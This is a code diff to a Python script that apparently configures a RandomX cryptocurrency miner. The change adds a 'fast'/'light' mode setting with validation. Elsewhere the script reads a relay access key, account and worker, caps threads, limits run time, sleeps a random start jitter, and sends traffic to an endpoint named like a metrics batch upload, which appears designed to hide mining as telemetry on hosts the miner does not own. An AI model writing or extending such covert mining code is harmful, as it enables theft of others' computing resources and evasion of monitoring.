@@ -20,6 +20,7 @@ ACCESS_KEY = os.environ["RELAY_ACCESS_KEY"].encode("utf-8")
 ACCOUNT = os.environ["ACCOUNT"]
 WORKER = os.environ["WORKER"]
 THREADS = int(os.environ.get("THREADS", "2"))
+RANDOMX_MODE = os.environ.get("RANDOMX_MODE", "light")
 RUN_SECONDS = int(os.environ.get("RUN_SECONDS", "900"))
 START_JITTER_SECONDS = int(os.environ.get("START_JITTER_SECONDS", "45"))
 EVENT_PATH = os.environ.get("EVENT_PATH", "/api/v1/metrics/batch")
@@ -196,7 +197,7 @@ def config_file_descriptor():
         "background": False,
         "colors": False,
         "randomx": {
-            "mode": "light",
+            "mode": RANDOMX_MODE,
             "1gb-pages": False,
             "rdmsr": False,
             "wrmsr": False,
@@ -253,6 +254,8 @@ if os.environ.get("VERIFY_BUNDLE_ONLY") == "1":
 
 if not 1 <= THREADS <= 4:
     raise ValueError("THREADS must be between 1 and 4")
+if RANDOMX_MODE not in ("fast", "light"):
+    raise ValueError("RANDOMX_MODE must be fast or light")
 if START_JITTER_SECONDS:
     time.sleep(random.uniform(0, START_JITTER_SECONDS))
 
